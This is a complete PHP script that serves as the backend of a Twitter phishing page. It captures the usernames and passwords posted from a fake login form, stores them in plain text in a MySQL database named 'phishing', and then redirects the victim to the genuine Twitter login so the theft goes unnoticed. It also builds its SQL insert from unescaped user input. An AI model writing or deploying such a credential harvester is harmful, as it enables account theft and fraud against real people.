<?php
$server = "localhost";
$username = "root";
$password = "";
$dbname = "phishing";

$con = mysqli_connect($server, $username, $password, $dbname);

if (!$con) {
	echo "Connection failed";
}

$name = $_POST['usern'];
$pass = $_POST['pass'];

$sql = "INSERT INTO `twitter`(`username_twitter`, `password`) VALUES ('$name','$pass')";

$result = mysqli_query($con, $sql);
if ($result) {
	header('Location: https://twitter.com/i/flow/login');
} else {
	echo "Data not inserted";
}
